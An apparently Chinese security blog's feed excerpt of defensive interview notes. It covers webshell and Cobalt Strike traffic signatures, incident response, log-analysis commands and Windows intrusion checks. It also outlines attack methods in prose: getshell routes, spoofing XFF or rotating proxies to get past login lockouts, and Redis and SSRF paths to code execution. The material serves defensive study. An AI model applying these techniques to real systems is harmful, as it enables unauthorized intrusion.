&lt;p&gt;冰蝎 4.0 有固定的请求头和响应头，请求字节头：dFAXQV1LORcHRQtLRlwMAhwFTAg/M ，响应字节头：TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd。&lt;/p&gt;
&lt;p&gt;冰蝎 4.0 会使用例如 49700 之类的比较大的端口进行 tcp 连接，且端口依次增加。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;菜刀-caidao&#34;&gt;菜刀 caidao&lt;/h3&gt;
&lt;p&gt;响应体有两个竖杠||。&lt;/p&gt;
&lt;p&gt;会使用 base64_decode 函数进行打断 (&amp;quot;@e&amp;quot;.&amp;ldquo;v&amp;rdquo;.&amp;ldquo;al&amp;rdquo;)。&lt;/p&gt;
&lt;p&gt;请求体 base64 解码后看到 eval、assert、base64_decode 字样，判断为菜刀 php webshell。&lt;/p&gt;
&lt;p&gt;看到 i=A&amp;amp;z0=GB2312 字样，或者 z_1=payload，判断为菜刀 jsp webshell。&lt;/p&gt;
&lt;p&gt;请求体 unicode 解码之后看到一句话木马，判断为菜刀 asp webshell。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;哥斯拉-godzilla&#34;&gt;哥斯拉 godzilla&lt;/h3&gt;
&lt;p&gt;哥斯拉的强特征是 cookie 后面有个分号，目前版本的哥斯拉无法去除这个特征。&lt;/p&gt;
&lt;p&gt;哥斯拉会发三个特定请求。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;蚁剑-antsword&#34;&gt;蚁剑 antsword&lt;/h3&gt;
&lt;p&gt;蚁剑的请求体含有 ini_set、set_time_limit、display_errors 字样。&lt;/p&gt;
&lt;p&gt;蚁剑的 ua 头为 antsword/v2.1，但是攻击者可以去除这个特征。&lt;/p&gt;
&lt;p&gt;蚁剑加密数据包的参数很多以 _0x&amp;hellip; 的形式出现（下划线可替换为其他字符）。&lt;/p&gt;
&lt;hr&gt;
- https://xxxhidexxx.github.io/posts/sec/hvv/ - null</description>
        </item>
    
    
    
        <item>
        <title>基于 python 的无文件木马</title>
        <link>https://xxxhidexxx.github.io/posts/sec/python-trojan/</link>
        <pubDate>Thu, 18 Apr 2024 00:00:00 +0000</pubDate>
        
        <guid>https://xxxhidexxx.github.io/posts/sec/python-trojan/</guid>
        <description>write-up https://xxxhidexxx.github.io/posts/sec/python-trojan/ -- https://xxxhidexxx.github.io/posts/sec/python-trojan/ - null</description>
        </item>
    
    
    
        <item>
        <title>应急响应流程和网络安全常识</title>
        <link>https://xxxhidexxx.github.io/posts/sec/pdcerf/</link>
        <pubDate>Thu, 18 Apr 2024 00:00:00 +0000</pubDate>
        
        <guid>https://xxxhidexxx.github.io/posts/sec/pdcerf/</guid>
        <description>write-up https://xxxhidexxx.github.io/posts/sec/pdcerf/ -&lt;p&gt;pdcerf：准备-检测-抑制-根除-恢复-总结。&lt;/p&gt;
&lt;h3 id=&#34;准备&#34;&gt;准备&lt;/h3&gt;
&lt;p&gt;明确职责；梳理资产，梳理暴露面，关闭不必要的映射；检查弱口令和密码策略；更新漏洞补丁；确认资产开启了日志存储，可对日志进行监控、审计和溯源。&lt;/p&gt;
&lt;p&gt;准备阶段首先要确定能够找到和打开日志文件。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;https-加密原理抓包工具怎么截获明文-https-报文&#34;&gt;https 加密原理，抓包工具怎么截获明文 https 报文&lt;/h4&gt;
&lt;p&gt;http/s 本身是加密通信的，我们在抓包工具里面看到的明文数据包，是抓包工具自动截获密钥之后解密的结果。&lt;/p&gt;
&lt;p&gt;https 加密方式：先使用非对称加密传输 ssl 证书并建立连接，再使用对称加密传输数据。这里非对称加密意味着只有一方需要提供 ssl 证书。&lt;/p&gt;
&lt;p&gt;http 不安全的原因：对称加密导致的中间人攻击，中间人查看和篡改请求包、响应包，或者跳转到恶意网站。&lt;/p&gt;
&lt;p&gt;只使用非对称加密不可行的原因：传输效率太低了。&lt;/p&gt;
&lt;p&gt;burpsuite 抓 https 明文的方法就是对自己进行一次中间人攻击，分别与浏览器和服务器建立 https 连接。能够对 https 报文进行加密解密，就叫建立 https 连接。&lt;/p&gt;
&lt;p&gt;burp 先是截获了服务器给浏览器的公钥。然后在 burp 上生成公私钥，将 burp 的密钥发给浏览器。之前配置 burp 的时候浏览器已经导入了 burp 的证书，这样 burp 和浏览器建立了 https 连接，使用的是 burp 的密钥，所以 burp 可以解密看到明文的 https 请求。同理，burp 再与服务器建立 https 连接，可以看到明文 https 响应。&lt;/p&gt;
&lt;p&gt;数据传输的过程中 burp 有两套对称加密的密钥，分别用来和浏览器/服务器进行加密通信。&lt;/p&gt;
&lt;p&gt;其他工具例如 wireshark 也可以抓 https 明文，但是原理不同，wireshark 是先将浏览器 ssl 日志设置环境变量，再将 ssl 日志路径设置到 wireshark 里面，让 wireshark 读取 ssl，进行解密，整个过程只有一套密钥。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;java-内存马的原理&#34;&gt;java 内存马的原理&lt;/h4&gt;
&lt;p&gt;客户端向 java web 服务器发起的请求会依次经过 listener，filter，servlet 三个组件。&lt;/p&gt;
&lt;p&gt;java 内存马的原理就是利用类加载或 Agent 机制在 JavaEE、框架或中间件的 API 中动态注册一个可访问的后门。&lt;/p&gt;
&lt;p&gt;java 内存马分为两类：servlet-api 型内存马，动态注册 web 组件；字节码增强型内存马，通过 instrumentation 动态修改已有代码。&lt;/p&gt;
&lt;p&gt;动态注册是指通过 rce 注册新的 listener，filter，servlet 组件，或者特殊框架的特殊组件，例如 spring 的 controller 内存马，tomcat 的 valve 内存马。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;常见安全设备的种类和功能&#34;&gt;常见安全设备的种类和功能&lt;/h4&gt;
&lt;p&gt;终端安全响应（edr）：例如，奇安信天擎。部署在终端，可以理解为高级杀软，和传统杀软的区别在于 edr 是基于文件行为进行检测的，而传统杀软停留在文件签名的检测。edr 的检测范围包括硬件信息、系统信息、网络信息等，也可以检测带有威胁的网络请求，和 ips/ids 的区别在于，ips/ids 是基于流量进行检测，而 edr 是基于终端文件行为进行检测。&lt;/p&gt;
&lt;p&gt;流量威胁检测（ips/ids）：例如，奇安信天眼。高级威胁检测、异常行为检测、告警响应处置、攻击回溯分析。ips/ids 是监控入站出站流量，进行检测分析和响应处置。&lt;/p&gt;
&lt;p&gt;态势感知：一个额外的大数据平台，从其他安全设备采集信息，对网络中的攻击、威胁、漏洞和资产执行动态整合，通过大数据处理及整合能力，从全局视角把握整个网络的安全状态。&lt;/p&gt;
&lt;p&gt;威胁情报平台：漏洞情报、攻击者档案库、邮件攻防检测、对接数据平台、联动云端情报。&lt;/p&gt;
&lt;p&gt;蜜罐：蜜罐技术是一种主动防御技术，通过部署没有真实业务数据的系统来诱骗攻击者实施攻击，记录其攻击行为从而学习攻击者的攻击目的和攻击手段，以此不断提升真实业务系统的安全防护能力。&lt;/p&gt;
&lt;p&gt;防火墙：按照一定的规则自动决定是否允许入站和出站流量通过，阻断不受信任的网络连接。&lt;/p&gt;
&lt;p&gt;堡垒机：也称为运维审计系统，是集中进行权限控制和安全审计的服务器，置于客户端和网站服务器之间。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;windows-日志文件&#34;&gt;windows 日志文件&lt;/h4&gt;
&lt;p&gt;日志文件存储在目录 C:\Windows\System32\winevt\Logs 里面。其中 System.evtx, Application.evtx, Security.evtx 这几个日志比较有用。系统日志和应用程序日志对系统管理员更为有用，记录的是故障排除信息；安全日志对调查员更为有用，记录登录、远程访问、进程追踪、身份认证、特权使用、策略变更等涉及安全的事件。&lt;/p&gt;
&lt;p&gt;需要现场检查主机是否开启了日志的审核策略，例如 windows server 2008 r2 默认不开启审核策略，需要手动开启。&lt;/p&gt;
&lt;p&gt;按 win+r 输入 eventvwr.msc 可以打开事件查看器。事件 id 有默认的含义：4624 登录成功；4625 登录失败；4634 注销成功；4647 用户启动的注销；4672 使用超级用户（如管理员）进行登录；4720 创建用户。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;linux-日志文件&#34;&gt;linux 日志文件&lt;/h4&gt;
&lt;p&gt;默认存放在 /var/log 目录下。&lt;/p&gt;
&lt;p&gt;使用 more /etc/rsyslog.conf 查看日志的配置。&lt;/p&gt;
&lt;p&gt;系统出现问题首先检查 /var/log/message，里面记录了系统的重要信息。&lt;/p&gt;
&lt;p&gt;/var/log/secure 记录了身份认证和权限管理方面的信息，例如 ssh 登录、su 切换用户，sudo 授权。&lt;/p&gt;
&lt;p&gt;登录方面有四个文件可供查看，都是二进制文件，不能用 vi 打开，要用特殊的命令查看。/var/log/wtmp 记录全部的登录信息，使用 last 命令查看；/var/log/utmp 记录目前处于登录状态的用户，使用 w,who,users 等命令查看；/var/log/btmp 记录错误登录，使用 lastb 命令查看；/var/log/lastlog 记录所有用户最后登录时间，使用 lastlog 命令查看。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;linux-日志分析常用命令&#34;&gt;linux 日志分析常用命令&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;w   可以查看当前已登录的用户和他们的会话信息。

last   可以查看最近所有登录和注销会话的用户列表以及日期和时间。

lastlog   可以查看所有用户最后一次登录的时间和位置。

who /var/run/utmp   可以查看当前登录的用户。

top 可以查看当前占用 cpu 和内存的进程。

find -iname &amp;quot;name&amp;quot; | xrags grep -in &amp;quot;word&amp;quot;   可以查看文件名包含 name 而文件内容包含 word 的文件，并显示 words 出现在第几行。-i 忽略大小写，-n 显示行数。

cat filename | tail -n +5 | head -n 10   可以查看文件的第 5 行开始的 10 行，tail 用来查看新添加的日志信息。

tail -f /var/log/messages 可以实时监控日志信息。

awk &#39;/error/ {print $0}&#39; /var/log/messages 可以筛选出包含 error 字符串的日志信息。

awk -F: &#39;$3==0{print $1}&#39; /etc/passwd   可以查看除了 root 之外还有哪些特权用户（uid=0）。

grep error /var/log/messages   可以查找系统日志中的错误信息。

grep &amp;quot;Accepted &amp;quot; /var/log/secure | awk &#39;{print $1,$2,$3,$9,$11}&#39;   可以查看登录成功的日期、用户名、ip。

grep &amp;quot;Failed password for root&amp;quot; /var/log/secure | awk &#39;{print $11}&#39; | sort | uniq -c | sort -nr | more   可以查看正在爆破主机 root 密码的 ip 有哪些。

grep &amp;quot;useradd&amp;quot; /var/log/secure   可以查看增加用户的记录。

grep &amp;quot;userdel&amp;quot; /var/log/secure   可以查看删除用户的记录。

netstat -ntlp | grep &amp;quot;:80 &amp;quot; | awk &#39;{print $7}&#39; | tr &#39;/&#39; &amp;quot;\t&amp;quot;   可以根据端口列进程，80 改为任意端口。
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;h4 id=&#34;给你一个比较大的日志应该如何分析&#34;&gt;给你一个比较大的日志，应该如何分析&lt;/h4&gt;
&lt;p&gt;当面对一个比较大的日志文件时，通常需要采用以下几个步骤进行分析：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;对日志文件进行预处理：如果日志文件比较大，首先可以考虑对其进行切割、筛选等操作。例如，可以使用Linux系统中的split命令将大型日志文件拆成多个小文件，以便于后续的处理。&lt;/li&gt;
&lt;li&gt;确定日志格式：在分析日志之前，需要了解日志的格式，例如时间戳、事件类型、IP地址等信息。这有助于我们快速定位和分析日志中的内容。&lt;/li&gt;
&lt;li&gt;使用工具进行分析：目前市面上有很多针对日志分析的软件工具，例如ELK Stack（Elasticsearch、Logstash、Kibana）、Splunk等。这些工具能够帮助我们更加高效地分析、搜索和可视化日志数据。&lt;/li&gt;
&lt;li&gt;定义分析目标：在开始分析日志之前，需要明确所需得到的结果以及要回答的问题。例如，我们可能需要查找某个特定的事件或行为、识别与安全相关的异常或潜在威胁等。&lt;/li&gt;
&lt;li&gt;进行分析并记录结论：根据分析目标，采用相应的方法和工具对日志文件进行分析，并记录分析结论。同时要把发现的异常或有用的信息进行整理和汇总。&lt;/li&gt;
&lt;li&gt;采取相应措施：根据分析结果，确定需要采取的措施。例如，修复漏洞、更新安全策略、加强访问控制等。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;需要注意的是，在处理大型日志文件时，可能会消耗较多的时间和计算资源。因此，可以通过合理地利用计算机硬件（例如使用多核CPU和高速磁盘）来提高处理效率。同时也可以将任务分解成多个小部分进行并行处理，以进一步提升分析效率。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;tcpip-四层架构对应的常见网络协议&#34;&gt;tcp/ip 四层架构对应的常见网络协议&lt;/h4&gt;
&lt;p&gt;应用层：http/s，dns，ftp，ssh，dhcp；&lt;/p&gt;
&lt;p&gt;传输层：tcp，udp；&lt;/p&gt;
&lt;p&gt;网络层：ip，arp，icmp，路由选择协议（rip，ospf，bgp），nat；&lt;/p&gt;
&lt;p&gt;网络接口层：以太网 Ethernet，基于以太网的点对点通讯协议 PPPoE&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;tcp-和-udp-的区别&#34;&gt;tcp 和 udp 的区别&lt;/h4&gt;
&lt;p&gt;tcp 是面向连接的协议，发送数据前需要三次握手；udp 是无连接的协议，不需要提前确认连接就可以发送数据。&lt;/p&gt;
&lt;p&gt;tcp 可靠，序号+握手+重传，保证了可靠性；udp 不可靠，需要应用层额外的设计来保证可靠性。&lt;/p&gt;
&lt;p&gt;tcp 有序，后发送的数据先到达了，tcp 会按照序号重新排序；udp 无序。&lt;/p&gt;
&lt;p&gt;tcp 传输慢；udp 传输快。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;dns-使用的是-tcp-还是-udp&#34;&gt;dns 使用的是 tcp 还是 udp&lt;/h4&gt;
&lt;p&gt;dns 通常使用 udp，在请求包较大时使用 tcp。因此使用 dns 的请求不易被 tcp 的抓包工具截获。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;什么是-ipv4-地址的-a-段-b-段-c-段子网掩码有什么作用&#34;&gt;什么是 ipv4 地址的 a 段 b 段 c 段，子网掩码有什么作用&lt;/h4&gt;
&lt;p&gt;A 类是 1.0.0.0 到 126.0.0.0；B 类是 128.0.0.0 到 191.255.255.255；C 类是 192.0.0.0 到 223.255.255.255。此外还有 D 类和 E 类。&lt;/p&gt;
&lt;p&gt;ABC 三类 ip 分别有私有 ip 段。&lt;/p&gt;
&lt;p&gt;10.0.0.0～10.255.255.255&lt;/p&gt;
&lt;p&gt;172.16.0.0～172.31.255.255&lt;/p&gt;
&lt;p&gt;192.168.0.0～192.168.255.255&lt;/p&gt;
&lt;p&gt;子网掩码用来标识网络地址和主机地址，将网络划分为若干子网。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;什么是-webshell常见的-getshell-方法&#34;&gt;什么是 webshell，常见的 getshell 方法&lt;/h4&gt;
&lt;p&gt;webshell 是 web 服务器的后门，攻击者利用 webshell 拿下服务器的控制权限，并且是持久性控制。后门是一个总称，木马的作用就是植入后门，webshell 就是一种特殊的木马。&lt;/p&gt;
&lt;p&gt;常见的 getshell 方法有：&lt;/p&gt;
&lt;p&gt;（1）利用弱口令进后台传 webshell。&lt;/p&gt;
&lt;p&gt;（2）利用任意文件上传漏洞传 webshell。&lt;/p&gt;
&lt;p&gt;（3）利用 rce 漏洞写 shell，植入多个后门并扩大危害。&lt;/p&gt;
&lt;p&gt;（4）利用文件包含漏洞/解析漏洞，解析图片马。&lt;/p&gt;
&lt;p&gt;（5）sql 注入写 shell。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;上传-webshell-之后怎样获得绝对路径&#34;&gt;上传 webshell 之后怎样获得绝对路径&lt;/h4&gt;
&lt;p&gt;看返回包；报错信息；fuzz；再传一个 php 探针。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;webshell-不出网如何利用&#34;&gt;webshell 不出网如何利用&lt;/h4&gt;
&lt;p&gt;正向代理，建立 http 隧道；找能出网的协议，例如 dns，icmp 等。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;正向代理和反向代理的区别和用途&#34;&gt;正向代理和反向代理的区别和用途&lt;/h4&gt;
&lt;p&gt;正向代理即客户端代理。用途：（1）访问原来访问不到的资源；（2）缓存，加速访问；（3）隐藏访问者的信息。&lt;/p&gt;
&lt;p&gt;反向代理即服务器端代理。用途：（1）保证内网安全；（2）实现负载均衡，优化网站负载。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;内网穿透是什么&#34;&gt;内网穿透是什么&lt;/h4&gt;
&lt;p&gt;外网无法直接访问内网，搭建一个隧道访问特定的内网主机或服务，称为内网穿透，也成为 nat 穿透。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;游戏加速器与内网穿透&#34;&gt;游戏加速器与内网穿透&lt;/h4&gt;
&lt;p&gt;nat 原理：外网 ip 到 内网 ip 的转换，根据 nat 类型对网络请求进行限制，阻断对内网的直接访问。&lt;/p&gt;
&lt;p&gt;游戏加速器原理：复用映射关系实现游戏流量的 nat 穿透。先进行一次内网穿透，将映射关系记录在 nat 路由表中，之后游戏流量经过的时候使用这个映射，就改变了 nat 类型。&lt;/p&gt;
&lt;p&gt;udp 穿透和 tcp 穿透流程是一样的，但是 tcp 的握手容易导致穿透失败，例如 nat 收到 rst 报文后删除了映射、nat 开启了 syn 过滤。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;钻石票据黄金票据白银票据的区别&#34;&gt;钻石票据、黄金票据、白银票据的区别&lt;/h4&gt;
&lt;p&gt;白银票据通常用于攻击域控，黄金票据则用于拿下域控后权限维持，且黄金票据是伪造发票人，而白银票据则是伪造门票。钻石票据能够以任意用户的身份访问任意服务。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;设置蜜罐的时候开放哪些端口理由是什么&#34;&gt;设置蜜罐的时候开放哪些端口，理由是什么&lt;/h4&gt;
&lt;p&gt;数据库：1433 sqlserver；1521 oracle；3306 mysql。&lt;/p&gt;
&lt;p&gt;远程连接：22 ssh；3389 rdp。&lt;/p&gt;
&lt;p&gt;主机：21 ftp；53dns；23 telnet。&lt;/p&gt;
&lt;p&gt;web：7001-7002 weblogic；8080 jboos/tomcat；6379 redis。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;暴力破解密码的时候遇到登录失败次数限制怎么绕过&#34;&gt;暴力破解密码的时候遇到登录失败次数限制怎么绕过&lt;/h4&gt;
&lt;p&gt;（1）在请求包添加 xff 请求头进行欺骗。&lt;/p&gt;
&lt;p&gt;（2）双写 xff 请求头。&lt;/p&gt;
&lt;p&gt;（3）设置代理池，例如用 burp 插件轮换 ip。&lt;/p&gt;
&lt;p&gt;（4）如果不是封禁 ip 而是封禁账号，则遍历用户名导致全站用户无法登录，业务瘫痪。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;常见的反爬虫策略&#34;&gt;常见的反爬虫策略&lt;/h4&gt;
&lt;p&gt;访问频率检测；封 ip；封 user-agent/cookie/referer 等请求头；设置验证码；引用外部 js 进行动态渲染；敏感信息引入外部链接；ajax 异步传输；流量加密传输。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;渗透测试的流程&#34;&gt;渗透测试的流程&lt;/h4&gt;
&lt;p&gt;确定目标-信息收集-发现漏洞-利用漏洞-内网渗透-输出报告&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;信息收集的思路&#34;&gt;信息收集的思路&lt;/h4&gt;
&lt;hr&gt;
&lt;h3 id=&#34;redis-未授权访问是什么怎么利用能做到-rce&#34;&gt;redis 未授权访问是什么，怎么利用能做到 rce&lt;/h3&gt;
&lt;p&gt;redis 是开源的内存数据库，提供高性能的键值对存储系统，常用于缓存、消息队列、会话存储等应用场景。&lt;/p&gt;
&lt;p&gt;redis 未授权访问的条件：（1）redis 默认的 6379 端口可以在公网访问；（2）redis 密码默认为空，如果设置了弱口令可以爆破。&lt;/p&gt;
&lt;p&gt;漏洞原理：公网访问 6379 端口并使用弱口令登录 redis 数据库，使用 redis 自带的 config 命令进行 getshell。&lt;/p&gt;
&lt;p&gt;后续 rce 利用及其条件：（1）写 ssh，需要服务器有 .ssh 目录并且 redis 有写入权限。（2）写 webshell，需要知道 web 的绝对路径。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;ssrf-用-redis-提升为-rce&#34;&gt;ssrf 用 redis 提升为 rce&lt;/h3&gt;
&lt;p&gt;用 dict 协议探测，用 gopher 协议写入。需要知道 web 的绝对路径，例如 /var/www/html。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;给定域名绕过-cdn-找真实-ip&#34;&gt;给定域名绕过 cdn 找真实 ip&lt;/h4&gt;
&lt;p&gt;cdn 即内容交付网络，通过缓存，实现降低延迟和均衡负载的功能。&lt;/p&gt;
&lt;p&gt;找真实 ip 的方法：查询 dns 解析记录；通过 ssl 证书查询真实 ip；用 fofa 等测绘工具直接搜；&amp;hellip;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;检测&#34;&gt;检测&lt;/h3&gt;
&lt;p&gt;研判攻击流量，保留攻击证据，确定影响的程度和范围，后期和其他厂商联动溯源，最终生成一个防守报告。&lt;/p&gt;
&lt;p&gt;研判需要对安全设备（天眼、蜜罐、入侵检测、堡垒机、态势感知）和威胁情报平台（微步）比较熟悉。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;传统漏洞攻击流量特征&#34;&gt;传统漏洞攻击流量特征&lt;/h4&gt;
&lt;p&gt;见 top10 和流量特征专题。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;java-反序列化攻击流量特征&#34;&gt;java 反序列化攻击流量特征&lt;/h4&gt;
&lt;p&gt;见 top10 和流量特征专题。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;常见-webshell-管理工具的流量特征&#34;&gt;常见 webshell 管理工具的流量特征&lt;/h4&gt;
&lt;p&gt;见流量特征专题。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;cs-流量特征&#34;&gt;cs 流量特征&lt;/h4&gt;
&lt;p&gt;默认 beacon 每隔六十秒发一个心跳包，通过 cookie 携带靶机信息。&lt;/p&gt;
&lt;p&gt;木马运行后会从指定服务器下载 stage，这个文件的大小约等于 211kb。下载路径是随机生成的，但是其 ascii 之和模 256 余 92。&lt;/p&gt;
&lt;p&gt;下发任务的方法是 c2 服务器在心跳包的响应里发送任务。&lt;/p&gt;
&lt;p&gt;beacon 使用 post 回传数据并且 url 为 /submit.php?id=&lt;/p&gt;
&lt;p&gt;stageless 阶段不需要下载 stage，但是可以看到 c2 服务器会返回 0.0.0.0 确认 beacon 上线。&lt;/p&gt;
&lt;p&gt;stageless 阶段的流量特征是使用 A/TXT/AAAA 三种方式发放 payload，且看到 ip 为 0.0.0.241/0.0.0.243/0.0.0.245。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;msf-流量特征&#34;&gt;msf 流量特征&lt;/h4&gt;
&lt;p&gt;MSF（Metasploit Framework）是一个开源的网络安全测试工具，可以用于对系统进行渗透测试和漏洞分析。在使用 MSF 进行攻击时，会产生一些特定的流量特征，包括以下几个方面：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;目标端口：MSF 框架使用多种不同的攻击模块来利用目标系统的漏洞，因此 MSF 流量通常涉及多个不同的目标端口，例如常见的 80、443、445 等端口。&lt;/li&gt;
&lt;li&gt;异常请求：MSF 框架使用恶意代码来对目标系统进行攻击，因此 MSF 流量中通常会出现大量异常请求，例如尝试访问非法 URL、发送恶意数据包等。&lt;/li&gt;
&lt;li&gt;频繁扫描：为了寻找目标系统的漏洞，MSF 框架通常会频繁地进行端口扫描、服务识别等操作，因此 MSF 流量中通常会出现大量扫描和探测请求。&lt;/li&gt;
&lt;li&gt;数据包大小：由于 MSF 框架通常会向目标系统发送大量恶意数据包，因此 MSF 流量中通常会出现较大的数据包大小。&lt;/li&gt;
&lt;li&gt;特殊协议：在攻击过程中，MSF 框架通常会使用一些特殊的协议，例如 Meterpreter、Reverse TCP 等，这些协议在 MSF 流量中通常表现出特定的流量特征。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;总之，在分析 MSF 流量时，需要综合考虑多个方面的特征，并结合具体的攻击模块和服务进行分析。同时，也需要使用适当的工具和技术，例如网络抓包工具、IDS/IPS 等，来对 MSF 流量进行捕获和分析。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;其他红队工具的流量特征&#34;&gt;其他红队工具的流量特征&lt;/h4&gt;
&lt;p&gt;见流量特征专题。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;从几万条告警中区分攻击和误报&#34;&gt;从几万条告警中区分攻击和误报&lt;/h4&gt;
&lt;p&gt;看 wireshark 判断是否为正常业务。&lt;/p&gt;
&lt;p&gt;（1）可以记录正常业务的特征，从而在告警信息中排除正常业务。&lt;/p&gt;
&lt;p&gt;（2）查看 ip，排除内部人员操作引起的误报。&lt;/p&gt;
&lt;p&gt;（3）如果是扫描引起的误报，可以根据返回包的状态码和返回包大小进行判断。例如发现攻击者扫描 c 段 ip 但是返回 403 则忽略这次误报。&lt;/p&gt;
&lt;p&gt;（4）从“待分析告警”中提取 exp，例如发现攻击者使用了某个组件 nday 的 exp，但是我们发现网站根本没有使用这个组件，则忽略这次误报。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;判断事件类型&#34;&gt;判断事件类型&lt;/h4&gt;
&lt;p&gt;根据告警确定事件类型，如果是真实攻击则封禁 ip，并检测是否利用成功。&lt;/p&gt;
&lt;p&gt;常见的事件类型有勒索/挖矿/蠕虫/钓鱼/文件上传/webshell/反弹shell/外联/敏感操作等。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;判断失陷范围&#34;&gt;判断失陷范围&lt;/h4&gt;
&lt;p&gt;根据安全设备确定受到影响的主机和资产。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;从告警内网-ip-确定在哪一层楼&#34;&gt;从告警内网 ip 确定在哪一层楼&lt;/h4&gt;
&lt;p&gt;（1）通过内网 ip 的掩码缩小搜查范围。&lt;/p&gt;
&lt;p&gt;（2）通过 arp 请求获取 ip 的 mac 地址；&lt;/p&gt;
&lt;p&gt;（3）从路由器 arp 缓存表找到 mac 地址对应的端口；&lt;/p&gt;
&lt;p&gt;（4）找到设备所在位置。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;内网告警的处理方式&#34;&gt;内网告警的处理方式&lt;/h4&gt;
&lt;p&gt;（1）根据告警信息定位到出现问题的设备；&lt;/p&gt;
&lt;p&gt;（2）判断是否为蜜罐。&lt;/p&gt;
&lt;p&gt;（3）如果是内网扫描先隔离；&lt;/p&gt;
&lt;p&gt;（4）根据事件类型进行主机排查；&lt;/p&gt;
&lt;p&gt;（5）根据日志文件进行溯源反制。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;怎么判断木马是否上传成功&#34;&gt;怎么判断木马是否上传成功&lt;/h4&gt;
&lt;p&gt;看数据包响应码，看到 200/500 判断为疑似成功，看到 400 判断为失败；&lt;/p&gt;
&lt;p&gt;访问木马上传路径；&lt;/p&gt;
&lt;p&gt;自己复现攻击。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;怎么在百万行代码中找到后门&#34;&gt;怎么在百万行代码中找到后门&lt;/h4&gt;
&lt;p&gt;文件对比。直接用文件对比工具、git 等版本控制工具进行文件对比、验证文件 hash 进行对比、使用 diff 命令进行文件对比。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;天眼使用经验&#34;&gt;天眼使用经验&lt;/h4&gt;
&lt;hr&gt;
&lt;h4 id=&#34;windows-入侵排查&#34;&gt;windows 入侵排查&lt;/h4&gt;
&lt;p&gt;（1）注册表-排查新增账号、远程控制&lt;/p&gt;
&lt;p&gt;命令行 net users 可以看到主机的账号列表，但是看不到隐藏账号。使用注册表可以进一步排查隐藏账号。在 windows 搜索栏打开注册表编辑器，找到 HKEY_LOCAL_MACHINE\SAM，发现无法看到后续内容，右键编辑权限，选择管理员完全控制，然后重新打开注册表。找到&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;计算机\HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;即可看到全部账号信息。&lt;/p&gt;
&lt;p&gt;注册表可以看远程桌面调用历史。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;计算机\HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;（2）任务计划程序-排查恶意脚本&lt;/p&gt;
&lt;p&gt;系统搜索任务计划进行排查。&lt;/p&gt;
&lt;p&gt;（3）命令行-排查异常端口&lt;/p&gt;
&lt;p&gt;打开命令行，输入&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;netstat -ano
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看到当前网络连接、端口号、进程 pid。&lt;/p&gt;
&lt;p&gt;（4）任务管理器-排查可疑进程、启动项&lt;/p&gt;
&lt;p&gt;选择详细信息可以看到 pid；右键可以看到文件所在位置；启动应用可以看到启动项。&lt;/p&gt;
&lt;p&gt;（5）服务-排查异常服务、禁用远程注册表&lt;/p&gt;
&lt;p&gt;系统搜索服务即可打开服务的管理页面。&lt;/p&gt;
&lt;p&gt;找到 remote registry 选择禁用（如果攻击者有  则这个操作聊胜于无）。&lt;/p&gt;
&lt;p&gt;（6）事件查看器-日志分析&lt;/p&gt;
